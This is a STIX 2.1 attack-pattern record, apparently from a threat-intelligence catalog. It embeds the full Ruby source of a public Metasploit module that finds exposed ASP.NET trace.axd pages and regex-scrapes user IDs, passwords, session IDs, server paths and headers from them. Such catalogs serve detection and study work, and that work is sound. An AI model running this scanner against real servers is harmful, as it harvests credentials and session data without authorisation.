{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--e2f103a4-e405-4c11-8009-a8c6bc3b925d",
    "created": "2024-08-14T16:29:35.447624Z",
    "modified": "2024-08-14T16:29:35.447629Z",
    "name": "HTTP trace.axd Content Scanner",
    "description": "Detect trace.axd files and analize its content",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/trace_axd.rb",
            "external_id": "trace_axd.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n\n  # Exploit mixins should be called first\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::WmapScanDir\n  # Scanner mixin should be near last\n  include Msf::Auxiliary::Scanner\n  include Msf::Auxiliary::Report\n\n  def initialize\n    super(\n      'Name'        => 'HTTP trace.axd Content Scanner',\n      'Description' => 'Detect trace.axd files and analize its content',\n      'Author'       => ['c4an'],\n      'License'     => MSF_LICENSE\n    )\n\n    register_options(\n      [\n        OptString.new('PATH',  [ true,  \"The test path to find trace.axd file\", '/']),\n        OptBool.new('TRACE_DETAILS', [ true,  \"Display trace.axd details\", true ])\n      ])\n\n    register_advanced_options(\n      [\n        OptString.new('StoreFile', [ false,  \"Store all information into a file\", './trace_axd.log'])\n      ])\n  end\n\n  def run_host(target_host)\n    tpath = normalize_uri(datastore['PATH'])\n    if tpath[-1,1] != '/'\n      tpath += '/'\n    end\n\n    begin\n      turl = tpath+'trace.axd'\n\n      res = send_request_cgi({\n        'uri'          => turl,\n        'method'       => 'GET',\n        'version' => '1.0',\n      }, 10)\n\n\n      if res and res.body.include?(\"<td><h1>Application Trace</h1></td>\")\n        print_good(\"[#{target_host}] #{tpath}trace.axd FOUND.\")\n\n        report_note(\n            :host\t=> target_host,\n            :proto => 'tcp',\n            :sname => (ssl ? 'https' : 'http'),\n            :port\t=> rport,\n            :type\t=> 'TRACE_AXD',\n            :data\t=> \"#{tpath}trace.axd\",\n            :update => :unique_data\n          )\n\n        if datastore['TRACE_DETAILS']\n\n          aregex = /Trace.axd\\?id=\\d/\n          result = res.body.scan(aregex).uniq\n\n          result.each do |u|\n            turl = tpath+u.to_s\n\n            res = send_request_cgi({\n              'uri'          => turl,\n              'method'       => 'GET',\n              'version' => '1.0',\n            }, 10)\n\n            if res\n              reg_info = [\n                /<td>UserId<\\/td><td>(\\w+.*)<\\/td>/,\n                /<td>Password<\\/td><td>(\\w+.*)<\\/td>/,\n                /<td>APPL_PHYSICAL_PATH<\\/td><td>(\\w+.*)<\\/td>/,\n                /<td>AspFilterSessionId<\\/td><td>(\\w+.*)<\\/td>/,\n                /<td>Via<\\/td><td>(\\w+.*)<\\/td>/,/<td>LOCAL_ADDR<\\/td><td>(\\w+.*)<\\/td>/,\n                /<td>ALL_RAW<\\/td><td>((.+\\n)+)<\\/td>/\n              ]\n              print_status(\"DETAIL: #{turl}\")\n              reg_info.each do |reg|\n                result = res.body.scan(reg).flatten.map{|s| s.strip}.uniq\n                str = result.to_s.chomp\n\n\n                if reg.to_s.include?\"APPL_PHYSICAL_PATH\"\n                  print_status(\"Physical Path: #{str}\")\n                elsif reg.to_s.include?\"UserId\"\n                  print_status(\"User ID: #{str}\")\n                elsif reg.to_s.include?\"Password\"\n                  print_status(\"Password: #{str}\")\n                elsif reg.to_s.include?\"AspFilterSessionId\"\n                  print_status(\"Session ID: #{str}\")\n                elsif reg.to_s.include?\"LOCAL_ADDR\"\n                  print_status(\"Local Address: #{str}\")\n                elsif result.include?\"Via\"\n                  print_status(\"VIA: #{str}\")\n                elsif reg.to_s.include?\"ALL_RAW\"\n                  print_status(\"Headers: #{str}\")\n                end\n              end\n            end\n          end\n        end\n      end\n\n    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout\n    rescue ::Timeout::Error, ::Errno::EPIPE\n    end\n  end\nend\n"
}